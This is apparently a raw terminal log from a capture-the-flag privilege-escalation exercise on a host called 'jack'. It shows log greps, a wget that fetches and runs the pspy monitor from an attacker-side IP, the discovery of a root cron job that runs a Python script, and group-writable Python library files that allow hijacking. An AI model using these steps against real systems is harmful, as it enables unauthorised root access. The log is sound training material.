2019-02-26 23:58:28 status installed passwd:amd64 1:4.2-3.1ubuntu5
2019-02-26 23:58:28 status unpacked passwd:amd64 1:4.2-3.1ubuntu5
2019-02-26 23:59:08 status half-configured passwd:amd64 1:4.2-3.1ubuntu5
2019-02-26 23:59:08 status half-installed passwd:amd64 1:4.2-3.1ubuntu5
2019-02-26 23:59:08 status unpacked passwd:amd64 1:4.2-3.1ubuntu5
2019-02-26 23:59:08 status unpacked passwd:amd64 1:4.2-3.1ubuntu5.3
2019-02-26 23:59:08 upgrade passwd:amd64 1:4.2-3.1ubuntu5 1:4.2-3.1ubuntu5.3
2019-02-26 23:59:09 configure passwd:amd64 1:4.2-3.1ubuntu5.3 <none>
2019-02-26 23:59:09 status half-configured passwd:amd64 1:4.2-3.1ubuntu5.3
2019-02-26 23:59:09 status installed passwd:amd64 1:4.2-3.1ubuntu5.3
2019-02-26 23:59:09 status unpacked passwd:amd64 1:4.2-3.1ubuntu5.3
 base-passwd depends on libc6 (>= 2.8); however:
 base-passwd depends on libdebconfclient0 (>= 0.145); however:
Binary file /var/log/auth.log matches
Binary file /var/log/syslog matches
Description: Set up users and passwords
dpkg: base-passwd: dependency problems, but configuring anyway as you requested:
Jan 10 08:05:13 jack passwd[4712]: pam_unix(passwd:chauthtok): password changed for jack
Jan 10 08:07:47 jack passwd[4720]: pam_unix(passwd:chauthtok): password changed for root
Jan 10 08:13:51 jack gpasswd[4787]: user jack removed by root from group lxd
Jan 10 09:00:20 jack gpasswd[4851]: user jack removed by root from group sudo
Jan 10 09:28:43 jack sudo:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=list
Jan 10 09:29:00 jack sudo:     jack : command not allowed ; TTY=pts/0 ; PWD=/home/jack ; USER=root ; COMMAND=list
Jan 10 14:57:46 jack systemd[1]: Started Dispatch Password Requests to Console Directory Watch.
Jan  8 11:23:39 jack systemd[1]: Started Dispatch Password Requests to Console Directory Watch.
Jan  9 09:57:08 jack sshd[1513]: Accepted password for jack from 192.168.1.137 port 52860 ssh2
Jan  9 09:57:22 jack sudo:     jack : 3 incorrect password attempts ; TTY=pts/0 ; PWD=/home/jack ; USER=root ; COMMAND=/bin/bash
Jan  9 09:57:40 jack sudo:     jack : TTY=pts/0 ; PWD=/home/jack ; USER=root ; COMMAND=/bin/bash
Jan  9 10:10:47 jack sudo:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/apt-get install apache2 libapache2-mod-php7.0 -y
Jan  9 10:11:35 jack chage[9952]: changed password expiry for mysql
Jan  9 10:16:53 jack sudo:     root : TTY=pts/0 ; PWD=/var/www ; USER=root ; COMMAND=/usr/sbin/a2enmod rewrite
Jan  9 10:22:24 jack sudo:     root : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/chown -R www-data:www-data /var/www/html/octobercms/
Jan  9 10:22:28 jack sudo:     root : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/chmod -R 755 /var/www/html/
Jan  9 10:22:32 jack sudo:     root : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/nano /etc/apache2/sites-available/octobercms.conf
Jan  9 10:22:47 jack sudo:     root : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/sbin/a2ensite octobercms
Jan  9 10:22:52 jack sudo:     root : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/systemctl restart apache2
Jan  9 10:23:20 jack sudo:     root : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/nano /etc/apache2/sites-available/octobercms.conf
Jan  9 10:23:47 jack sudo:     root : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/systemctl restart apache2
Jan  9 10:25:41 jack sudo:     root : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/nano /etc/apache2/sites-available/octobercms.conf
Jan  9 10:26:04 jack sudo:     root : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/nano /etc/apache2/sites-available/octobercms.conf
Jan  9 10:28:57 jack sudo:     root : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/nano /etc/apache2/sites-available/octobercms.conf
Jan  9 10:29:41 jack sudo:     root : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/nano /etc/apache2/sites-available/octobercms.conf
Jan  9 10:29:56 jack sudo:     root : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/nano /etc/apache2/sites-available/octobercms.conf
Jan  9 13:22:40 jack systemd[1]: Started Dispatch Password Requests to Console Directory Watch.
Jan  9 13:23:50 jack sshd[1630]: Accepted password for jack from 192.168.1.137 port 53030 ssh2
Jan  9 13:23:54 jack sudo:     jack : TTY=pts/0 ; PWD=/home/jack ; USER=root ; COMMAND=/bin/bash
Preparing to unpack .../base-passwd_3.5.39_amd64.deb ...
Preparing to unpack .../passwd_1%3a4.2-3.1ubuntu5_amd64.deb ...
Selecting previously unselected package base-passwd.
Selecting previously unselected package passwd.
Setting up base-passwd (3.5.39) ...


ack@jack:/tmp$ wget http://10.8.19.103:8000/pspy64s
--2023-01-18 15:24:18--  http://10.8.19.103:8000/pspy64s
Connecting to 10.8.19.103:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1156536 (1.1M) [application/octet-stream]
Saving to: ‘pspy64s’

pspy64s                        100%[====================================================>]   1.10M   609KB/s    in 1.9s    

2023-01-18 15:24:20 (609 KB/s) - ‘pspy64s’ saved [1156536/1156536]

jack@jack:/tmp$ chmod +x pspy64s; ./pspy64s
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2023/01/18 15:24:39 CMD: UID=0    PID=959    | /sbin/iscsid 
2023/01/18 15:24:39 CMD: UID=0    PID=958    | /sbin/iscsid 
2023/01/18 15:24:39 CMD: UID=0    PID=954    | /usr/lib/policykit-1/polkitd --no-debug 
2023/01/18 15:24:39 CMD: UID=0    PID=928    | /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemonise --scan --syslog 
2023/01/18 15:24:39 CMD: UID=0    PID=918    | /usr/sbin/acpid 
2023/01/18 15:24:39 CMD: UID=0    PID=913    | /usr/lib/accountsservice/accounts-daemon 
2023/01/18 15:24:39 CMD: UID=111  PID=901    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation 
2023/01/18 15:24:39 CMD: UID=0    PID=9      | 
2023/01/18 15:24:39 CMD: UID=0    PID=892    | /usr/lib/snapd/snapd 
2023/01/18 15:24:39 CMD: UID=108  PID=890    | /usr/sbin/rsyslogd -n 
2023/01/18 15:24:39 CMD: UID=0    PID=882    | /usr/bin/lxcfs /var/lib/lxcfs/ 
2023/01/18 15:24:39 CMD: UID=0    PID=879    | /lib/systemd/systemd-logind 
2023/01/18 15:24:39 CMD: UID=0    PID=876    | /usr/sbin/atd -f 
2023/01/18 15:24:39 CMD: UID=0    PID=865    | /usr/sbin/cron -f 
2023/01/18 15:24:39 CMD: UID=0    PID=84     | 
2023/01/18 15:24:39 CMD: UID=0    PID=83     | 
2023/01/18 15:24:39 CMD: UID=0    PID=82     | 
2023/01/18 15:24:39 CMD: UID=0    PID=8      | 
2023/01/18 15:24:39 CMD: UID=0    PID=721    | /sbin/dhclient -1 -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0 
2023/01/18 15:24:39 CMD: UID=0    PID=7      | 
2023/01/18 15:24:39 CMD: UID=1000 PID=6905   | -bash 
2023/01/18 15:24:39 CMD: UID=1000 PID=6904   | sshd: jack@pts/1     
2023/01/18 15:24:39 CMD: UID=0    PID=69     | 
2023/01/18 15:24:39 CMD: UID=0    PID=6871   | sshd: jack [priv]    
2023/01/18 15:24:39 CMD: UID=0    PID=6795   | 
2023/01/18 15:24:39 CMD: UID=0    PID=64     | 
2023/01/18 15:24:39 CMD: UID=1000 PID=6202   | ./pspy64s 
2023/01/18 15:24:39 CMD: UID=0    PID=62     | 
2023/01/18 15:24:39 CMD: UID=0    PID=61     | 
2023/01/18 15:24:39 CMD: UID=0    PID=60     | 
2023/01/18 15:24:39 CMD: UID=0    PID=6      | 
2023/01/18 15:24:39 CMD: UID=0    PID=59     | 
2023/01/18 15:24:39 CMD: UID=0    PID=58     | 
2023/01/18 15:24:39 CMD: UID=0    PID=57     | 
2023/01/18 15:24:39 CMD: UID=0    PID=56     | 
2023/01/18 15:24:39 CMD: UID=0    PID=55     | 
2023/01/18 15:24:39 CMD: UID=0    PID=54     | 
2023/01/18 15:24:39 CMD: UID=0    PID=53     | 
2023/01/18 15:24:39 CMD: UID=0    PID=52     | 
2023/01/18 15:24:39 CMD: UID=0    PID=51     | 
2023/01/18 15:24:39 CMD: UID=0    PID=50     | 
2023/01/18 15:24:39 CMD: UID=0    PID=5      | 
2023/01/18 15:24:39 CMD: UID=0    PID=49     | 
2023/01/18 15:24:39 CMD: UID=102  PID=476    | /lib/systemd/systemd-timesyncd 
2023/01/18 15:24:39 CMD: UID=0    PID=438    | /lib/systemd/systemd-udevd 
2023/01/18 15:24:39 CMD: UID=0    PID=4      | 
2023/01/18 15:24:39 CMD: UID=0    PID=397    | /sbin/lvmetad -f 
2023/01/18 15:24:39 CMD: UID=0    PID=394    | 
2023/01/18 15:24:39 CMD: UID=0    PID=393    | 
2023/01/18 15:24:39 CMD: UID=0    PID=392    | 
2023/01/18 15:24:39 CMD: UID=0    PID=391    | 
2023/01/18 15:24:39 CMD: UID=0    PID=390    | 
2023/01/18 15:24:39 CMD: UID=0    PID=386    | 
2023/01/18 15:24:39 CMD: UID=0    PID=373    | 
2023/01/18 15:24:39 CMD: UID=0    PID=372    | 
2023/01/18 15:24:39 CMD: UID=0    PID=355    | /lib/systemd/systemd-journald 
2023/01/18 15:24:39 CMD: UID=0    PID=33     | 
2023/01/18 15:24:39 CMD: UID=0    PID=32     | 
2023/01/18 15:24:39 CMD: UID=0    PID=31     | 
2023/01/18 15:24:39 CMD: UID=0    PID=30     | 
2023/01/18 15:24:39 CMD: UID=0    PID=3      | 
2023/01/18 15:24:39 CMD: UID=0    PID=288    | 
2023/01/18 15:24:39 CMD: UID=0    PID=287    | 
2023/01/18 15:24:39 CMD: UID=0    PID=27     | 
2023/01/18 15:24:39 CMD: UID=0    PID=263    | 
2023/01/18 15:24:39 CMD: UID=0    PID=26     | 
2023/01/18 15:24:39 CMD: UID=0    PID=25     | 
2023/01/18 15:24:39 CMD: UID=0    PID=247    | 
2023/01/18 15:24:39 CMD: UID=0    PID=24     | 
2023/01/18 15:24:39 CMD: UID=0    PID=232    | 
2023/01/18 15:24:39 CMD: UID=0    PID=23     | 
2023/01/18 15:24:39 CMD: UID=0    PID=22     | 
2023/01/18 15:24:39 CMD: UID=0    PID=21     | 
2023/01/18 15:24:39 CMD: UID=0    PID=20242  | 
2023/01/18 15:24:39 CMD: UID=0    PID=20     | 
2023/01/18 15:24:39 CMD: UID=0    PID=2      | 
2023/01/18 15:24:39 CMD: UID=0    PID=19     | 
2023/01/18 15:24:39 CMD: UID=0    PID=18     | 
2023/01/18 15:24:39 CMD: UID=0    PID=17     | 
2023/01/18 15:24:39 CMD: UID=0    PID=160    | 
2023/01/18 15:24:39 CMD: UID=1000 PID=1527   | -bash 
2023/01/18 15:24:39 CMD: UID=1000 PID=1526   | sshd: jack@pts/0     
2023/01/18 15:24:39 CMD: UID=0    PID=15     | 
2023/01/18 15:24:39 CMD: UID=1000 PID=1466   | (sd-pam)   
2023/01/18 15:24:39 CMD: UID=1000 PID=1464   | /lib/systemd/systemd --user 
2023/01/18 15:24:39 CMD: UID=0    PID=1462   | sshd: jack [priv]    
2023/01/18 15:24:39 CMD: UID=33   PID=1458   | /usr/sbin/apache2 -k start 
2023/01/18 15:24:39 CMD: UID=0    PID=14     | 
2023/01/18 15:24:39 CMD: UID=33   PID=1357   | /usr/sbin/apache2 -k start 
2023/01/18 15:24:39 CMD: UID=33   PID=1356   | /usr/sbin/apache2 -k start 
2023/01/18 15:24:39 CMD: UID=33   PID=1355   | /usr/sbin/apache2 -k start 
2023/01/18 15:24:39 CMD: UID=33   PID=1354   | /usr/sbin/apache2 -k start 
2023/01/18 15:24:39 CMD: UID=33   PID=1353   | /usr/sbin/apache2 -k start 
2023/01/18 15:24:39 CMD: UID=0    PID=130    | 
2023/01/18 15:24:39 CMD: UID=0    PID=13     | 
2023/01/18 15:24:39 CMD: UID=0    PID=129    | 
2023/01/18 15:24:39 CMD: UID=0    PID=1284   | logger -t mysqld -p daemon error 
2023/01/18 15:24:39 CMD: UID=118  PID=1283   | /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=mysql --skip-log-error --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306 
2023/01/18 15:24:39 CMD: UID=0    PID=128    | 
2023/01/18 15:24:39 CMD: UID=0    PID=127    | 
2023/01/18 15:24:39 CMD: UID=0    PID=126    | 
2023/01/18 15:24:39 CMD: UID=0    PID=125    | 
2023/01/18 15:24:39 CMD: UID=0    PID=124    | 
2023/01/18 15:24:39 CMD: UID=0    PID=123    | 
2023/01/18 15:24:39 CMD: UID=0    PID=122    | 
2023/01/18 15:24:39 CMD: UID=0    PID=12     | 
2023/01/18 15:24:39 CMD: UID=0    PID=1197   | /usr/sbin/apache2 -k start 
2023/01/18 15:24:39 CMD: UID=0    PID=1122   | /bin/bash /usr/bin/mysqld_safe 
2023/01/18 15:24:39 CMD: UID=0    PID=11     | 
2023/01/18 15:24:39 CMD: UID=0    PID=1060   | /sbin/agetty --noclear tty1 linux 
2023/01/18 15:24:39 CMD: UID=0    PID=1057   | /sbin/agetty --keep-baud 115200 38400 9600 ttyS0 vt220 
2023/01/18 15:24:39 CMD: UID=0    PID=1005   | /usr/sbin/sshd -D 
2023/01/18 15:24:39 CMD: UID=0    PID=10     | 
2023/01/18 15:24:39 CMD: UID=0    PID=1      | /sbin/init 
2023/01/18 15:26:01 CMD: UID=0    PID=6214   | /usr/sbin/CRON -f 
2023/01/18 15:26:01 CMD: UID=0    PID=6216   | /usr/bin/python /opt/statuscheck/checker.py 
2023/01/18 15:26:01 CMD: UID=0    PID=6215   | /bin/sh -c /usr/bin/python /opt/statuscheck/checker.py 
2023/01/18 15:26:02 CMD: UID=0    PID=6218   | /usr/bin/curl -s -I http://127.0.0.1 
2023/01/18 15:26:02 CMD: UID=0    PID=6217   | sh -c /usr/bin/curl -s -I http://127.0.0.1 >> /opt/statuscheck/output.log 

jack@jack:/tmp$ cd /opt/statuscheck/
jack@jack:/opt/statuscheck$ ls
checker.py  output.log
jack@jack:/opt/statuscheck$ cat checker.py 
import os

os.system("/usr/bin/curl -s -I http://127.0.0.1 >> /opt/statuscheck/output.log")
jack@jack:/opt/statuscheck$ cat output.log 
HTTP/1.1 200 OK
Date: Sat, 11 Jan 2020 00:44:01 GMT
Server: Apache/2.4.18 (Ubuntu)
Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Sat, 11 Jan 2020 00:46:01 GMT
Server: Apache/2.4.18 (Ubuntu)
Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Sat, 11 Jan 2020 00:48:01 GMT
Server: Apache/2.4.18 (Ubuntu)
Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Sat, 11 Jan 2020 00:50:01 GMT
Server: Apache/2.4.18 (Ubuntu)
Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Sat, 11 Jan 2020 00:52:01 GMT
Server: Apache/2.4.18 (Ubuntu)
Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Sat, 11 Jan 2020 00:54:01 GMT
Server: Apache/2.4.18 (Ubuntu)
Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Sat, 11 Jan 2020 00:56:01 GMT
Server: Apache/2.4.18 (Ubuntu)
Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Sat, 11 Jan 2020 00:58:02 GMT
Server: Apache/2.4.18 (Ubuntu)
Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Sat, 11 Jan 2020 01:00:01 GMT
Server: Apache/2.4.18 (Ubuntu)
Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Sat, 11 Jan 2020 01:02:01 GMT
Server: Apache/2.4.18 (Ubuntu)
Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Sat, 11 Jan 2020 01:04:01 GMT
Server: Apache/2.4.18 (Ubuntu)
Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Sat, 11 Jan 2020 01:06:01 GMT
Server: Apache/2.4.18 (Ubuntu)
Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Sat, 11 Jan 2020 01:08:01 GMT
Server: Apache/2.4.18 (Ubuntu)
Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Sat, 11 Jan 2020 01:10:01 GMT
Server: Apache/2.4.18 (Ubuntu)
Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Sat, 11 Jan 2020 01:12:01 GMT
Server: Apache/2.4.18 (Ubuntu)
Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Sat, 11 Jan 2020 01:14:01 GMT
Server: Apache/2.4.18 (Ubuntu)
Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Sat, 11 Jan 2020 01:16:01 GMT
Server: Apache/2.4.18 (Ubuntu)
Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Sat, 11 Jan 2020 01:18:01 GMT
Server: Apache/2.4.18 (Ubuntu)
Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Sat, 11 Jan 2020 01:20:01 GMT
Server: Apache/2.4.18 (Ubuntu)
Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Sat, 11 Jan 2020 01:22:01 GMT
Server: Apache/2.4.18 (Ubuntu)
Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Mon, 13 Jan 2020 19:12:02 GMT
Server: Apache/2.4.18 (Ubuntu)
Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Mon, 16 Nov 2020 20:28:02 GMT
Server: Apache/2.4.18 (Ubuntu)
Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Mon, 16 Nov 2020 20:30:01 GMT
Server: Apache/2.4.18 (Ubuntu)
Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Mon, 16 Nov 2020 20:32:01 GMT
Server: Apache/2.4.18 (Ubuntu)
Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Mon, 16 Nov 2020 20:34:01 GMT
Server: Apache/2.4.18 (Ubuntu)
Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Mon, 16 Nov 2020 20:36:01 GMT
Server: Apache/2.4.18 (Ubuntu)
Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Mon, 16 Nov 2020 20:38:01 GMT
Server: Apache/2.4.18 (Ubuntu)
Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Mon, 16 Nov 2020 20:40:01 GMT
Server: Apache/2.4.18 (Ubuntu)
Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Mon, 16 Nov 2020 20:42:01 GMT
Server: Apache/2.4.18 (Ubuntu)
Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Mon, 16 Nov 2020 20:44:01 GMT
Server: Apache/2.4.18 (Ubuntu)
Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Wed, 18 Jan 2023 20:50:04 GMT
Server: Apache/2.4.18 (Ubuntu)
Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Wed, 18 Jan 2023 20:52:01 GMT
Server: Apache/2.4.18 (Ubuntu)
Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Wed, 18 Jan 2023 20:54:01 GMT
Server: Apache/2.4.18 (Ubuntu)
Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Wed, 18 Jan 2023 20:56:01 GMT
Server: Apache/2.4.18 (Ubuntu)
Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Wed, 18 Jan 2023 20:58:01 GMT
Server: Apache/2.4.18 (Ubuntu)
Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Wed, 18 Jan 2023 21:00:01 GMT
Server: Apache/2.4.18 (Ubuntu)
Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Wed, 18 Jan 2023 21:02:01 GMT
Server: Apache/2.4.18 (Ubuntu)
Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Wed, 18 Jan 2023 21:04:01 GMT
Server: Apache/2.4.18 (Ubuntu)
Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Wed, 18 Jan 2023 21:06:01 GMT
Server: Apache/2.4.18 (Ubuntu)
Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Wed, 18 Jan 2023 21:08:01 GMT
Server: Apache/2.4.18 (Ubuntu)
Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Wed, 18 Jan 2023 21:10:01 GMT
Server: Apache/2.4.18 (Ubuntu)
Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Wed, 18 Jan 2023 21:12:01 GMT
Server: Apache/2.4.18 (Ubuntu)
Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Wed, 18 Jan 2023 21:14:01 GMT
Server: Apache/2.4.18 (Ubuntu)
Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Wed, 18 Jan 2023 21:16:01 GMT
Server: Apache/2.4.18 (Ubuntu)
Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Wed, 18 Jan 2023 21:18:01 GMT
Server: Apache/2.4.18 (Ubuntu)
Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Wed, 18 Jan 2023 21:20:01 GMT
Server: Apache/2.4.18 (Ubuntu)
Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Wed, 18 Jan 2023 21:22:01 GMT
Server: Apache/2.4.18 (Ubuntu)
Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Wed, 18 Jan 2023 21:24:01 GMT
Server: Apache/2.4.18 (Ubuntu)
Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Wed, 18 Jan 2023 21:26:02 GMT
Server: Apache/2.4.18 (Ubuntu)
Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
Content-Type: text/html; charset=UTF-8

jack@jack:/tmp$ id
uid=1000(jack) gid=1000(jack) groups=1000(jack),4(adm),24(cdrom),30(dip),46(plugdev),115(lpadmin),116(sambashare),1001(family)


jack@jack:/opt/statuscheck$ find / -group family 2>/dev/null
/usr/lib/python2.7/_threading_local.py
/usr/lib/python2.7/plistlib.pyc
/usr/lib/python2.7/stringprep.py
/usr/lib/python2.7/ihooks.pyc
/usr/lib/python2.7/weakref.py
/usr/lib/python2.7/sgmllib.pyc
/usr/lib/python2.7/os.py
/usr/lib/python2.7/posixpath.py
/usr/lib/python2.7/copy_reg.py
/usr/lib/python2.7/bdb.py
/usr/lib/python2.7/smtpd.pyc
/usr/lib/python2.7/dircache.pyc
/usr/lib/python2.7/bisect.pyc
/usr/lib/python2.7/fnmatch.py
/usr/lib/python2.7/heapq.py
/usr/lib/python2.7/struct.pyc
/usr/lib/python2.7/fpformat.py
/usr/lib/python2.7/hotshot
/usr/lib/python2.7/shutil.py
/usr/lib/python2.7/posixpath.pyc
/usr/lib/python2.7/cmd.py
/usr/lib/python2.7/hmac.py
/usr/lib/python2.7/_sysconfigdata.pyc
/usr/lib/python2.7/plistlib.py
/usr/lib/python2.7/contextlib.py
/usr/lib/python2.7/posixfile.pyc
/usr/lib/python2.7/Bastion.pyc
/usr/lib/python2.7/macpath.pyc
/usr/lib/python2.7/telnetlib.py
/usr/lib/python2.7/anydbm.pyc
/usr/lib/python2.7/posixfile.py
/usr/lib/python2.7/htmlentitydefs.pyc
/usr/lib/python2.7/collections.pyc
/usr/lib/python2.7/modulefinder.py
/usr/lib/python2.7/inspect.pyc
/usr/lib/python2.7/SimpleXMLRPCServer.pyc
/usr/lib/python2.7/dircache.py
/usr/lib/python2.7/_pyio.py
/usr/lib/python2.7/Cookie.py
/usr/lib/python2.7/pipes.py
/usr/lib/python2.7/rlcompleter.pyc
/usr/lib/python2.7/SocketServer.py
/usr/lib/python2.7/tempfile.py
/usr/lib/python2.7/smtpd.py
/usr/lib/python2.7/uuid.py
/usr/lib/python2.7/repr.pyc
/usr/lib/python2.7/webbrowser.pyc
/usr/lib/python2.7/multifile.pyc
/usr/lib/python2.7/rfc822.pyc
/usr/lib/python2.7/xdrlib.py
/usr/lib/python2.7/ssl.pyc
/usr/lib/python2.7/symtable.py
/usr/lib/python2.7/test
/usr/lib/python2.7/csv.py
